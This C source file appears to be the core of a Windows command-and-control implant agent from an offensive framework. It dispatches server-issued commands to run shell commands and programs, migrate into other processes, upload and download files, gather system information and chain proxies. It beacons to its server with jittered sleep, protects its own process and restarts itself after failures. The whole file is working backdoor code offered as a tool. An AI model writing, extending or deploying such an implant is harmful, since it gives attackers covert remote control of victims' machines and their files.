#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <stdint.h>
#include <direct.h>
#include <process.h>
#include <io.h>
#include <fcntl.h>
#include "cJSON.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_utility.h"
#include "agent_config.h"
#include "agent_shell.h"
#include "agent_commands.h"

// OS-dependent functions
extern bool load_config(session* sess, packet* pck);
extern bool regist_agent(session* sess, packet* pck);
extern char* get_process_list(void);
extern bool protect_process(session* sess);

agent_command g_commands[] = {
	{COMMAND_SLEEP, cmd_sleep},
	{COMMAND_MIGRATE, cmd_migrate_to_process},
	{COMMAND_RUNPROGRAM, cmd_run_program},
	{COMMAND_TERMINATESHELL, cmd_shell_terminate},
	{COMMAND_RUNSHELLCOMMAND, cmd_shell_run_command},
	{COMMAND_DOWNLOADFILES, cmd_download_files},
	{COMMAND_UPLOADFILES, cmd_upload_files},
	{COMMAND_SYSINFO, cmd_systeminfo},
	{COMMAND_SYSINFOEXTENDED, cmd_extended_systeminfo},
	{COMMAND_EXECPROGRAM, cmd_exec_program},
	{COMMAND_KILL, cmd_kill},
	{COMMAND_PROXYUSE, cmd_proxy_use},
	{COMMAND_PROXYCLOSE, cmd_proxy_close},
	{COMMAND_PROXYSTOP, cmd_proxy_stop},
	{COMMAND_PROXYCHAINCREATE, cmd_proxy_chain_create},
	{COMMAND_PROXYCHAINSTOP, cmd_proxy_chain_stop},
	{COMMAND_PROXYINFO, cmd_proxy_info}
};

bool run_command_callback(session* sess, packet* pck) {
	size_t i = 0;
	bool result = true;
	for (; i < _countof(g_commands); i++) {
		if (g_commands[i].command_id == pck->data_type) {
			command_callback callback = g_commands[i].callback;			
			command_result* cmd_result = callback(sess, pck);			
			result = result && cmd_result->success;
			if (!cmd_result->success || cmd_result->send_result) {
				// compose payload
				char* payload = serialize_command_result(cmd_result);
				if (payload) message_send_command_result(sess, pck, payload);
				FREE(payload);				
			}				
			FREE_RESULT(cmd_result);
		}
	}

exit:	
	return result;
}

static bool process_command(session* sess, packet* pck) {
	char response[32] = { 0 };
	bool result = true;
	DECLARE_RESULT_WITH_FEEDBACK(cmd_result);
	char* payload = ZERO(char);

	switch (pck->data_type)
	{
	case COMMAND_REGISTER:
		regist_agent(sess, pck);
		break;	
	case COMMAND_NOCOMMAND:
		break;
	case COMMAND_TERMINATE:
		sess->exit = true;
		break;
	case COMMAND_UPDATECONFIG:
		if (!load_config(sess, pck)) goto fail;
		break;
	case COMMAND_GETCONFIG:
		payload = cJSON_Print(sess->config);
		if (!payload) goto fail;
		message_send_data(sess, pck, strlen(payload) + 1, (uint8_t*)payload);
		FREE(payload);
		break;
	case COMMAND_PUBLICIP:
		// this command is generally send by the Server during the registration process
		payload = MEM_ALLOC(pck->data_size + 1);
		if (!payload) goto fail;
		memcpy(payload, pck->data, pck->data_size);
		sess->public_IP = payload;
		break;	
	case COMMAND_PROCESSLIST:
		payload = get_process_list();
		if (payload) {
			message_send_data(sess, pck, strlen(payload), (uint8_t*)(payload));
			SET_RESULT_SUCCESS(cmd_result);
			FREE(payload);
		}
		payload = serialize_command_result(cmd_result);
		if (payload) message_send_command_result(sess, pck, payload);
		FREE(payload);
		break;
	default: 
		result = run_command_callback(sess, pck);		
		break;
	}
	goto exit;
fail:
	FREE_RESULT(cmd_result);
	result = false;
exit:
	FREE_RESULT(cmd_result);
	return result;
}

static bool process_message(session* sess, packet* pck) {
	while (pck) {
		if (!process_command(sess, pck)) goto fail;
		pck = pck->next;
	}
	return true;

fail:
	return false;
}

static bool request_command(session* sess, size_t data_size, uint8_t* data, uint32_t id, uint32_t req_type, bool force_add) {
	message* msg = message_create(sess);
	if (!msg) goto fail;
	if (!message_add_request_data(msg, data_size, data, id, 0, req_type, PACKET_STATE_NO_MORE_PACKETS, force_add)) goto fail;

	// send the data
	if (!message_send(sess, msg)) goto fail;

	// process the received data	
	if (!process_message(sess, msg->response)) goto fail;
	msg = message_free(msg);
	return true;

fail:
	if (msg) message_free(msg);
	return false;
}


static void sleep(session* sess) {
	uint32_t sleep_timeout = 60000;
	cJSON* jsession = cJSON_GetObjectItemCaseSensitive(sess->config, CONFIG_SESSION);
	if (jsession) {
		cJSON* jsleep = cJSON_GetObjectItemCaseSensitive(jsession, CONFIG_SESSION_SLEEP);
		if (jsleep && jsleep->valueint > 0) sleep_timeout = jsleep->valueint;

		cJSON* jitter = cJSON_GetObjectItemCaseSensitive(jsession, CONFIG_SESSION_JITTER);
		if (jitter && jitter->valueint > 0) {
			uint32_t range = (uint32_t)((float)sleep_timeout * ((float)jitter->valueint / 100.0));
			uint32_t min_range = sleep_timeout - range;
			sleep_timeout = (rand() % (2 * range)) + min_range + 1;
		}
	}
	sleep_ms(sleep_timeout);
}

static void command_loop(session* sess) {
	uint32_t retry = 0;
	while (!sess->exit && retry <= 5) {
		if (sess->is_established) {
			if (!request_command(sess, 0, (uint8_t*)0, 0, REQUEST_ASKCOMMAND, false)) {
				// if there is an error, retry the request by forcing a post request
				if (!request_command(sess, 0, (uint8_t*)0, 0, REQUEST_ASKCOMMAND, true)) {
					retry++;
				}					
				else {
					retry = 0;
				}					
			}
		}
		else {
			if (!request_command(sess, 0, (uint8_t*)0, 0, REQUEST_REGISTER, true))
				retry++;
			else
				retry = 0;
		}

		if (!session_release_garbage(sess)) break;
		sleep(sess);
	}
}

bool agent_main(char* jconfig, char const* prog_name) {
	session* sess = session_create(jconfig, prog_name);
	if (!sess) goto fail;
	
	if (sess->single_instance_event) {
		protect_process(sess);

		while (!sess->exit) {
			if (is_agent_expired(sess)) {
				sess->exit = true;
			}
			else {
				command_loop(sess);

				if (!sess->exit) {
					// something is wrong, re-try from a clean state
					session_free(sess);
					sess = session_create(jconfig, prog_name);
					if (!sess) goto fail;
				}
			}
		}
	}

	// terminate execute process if spawned		
	session_free(sess);	
	return true;
fail:
	return false;
}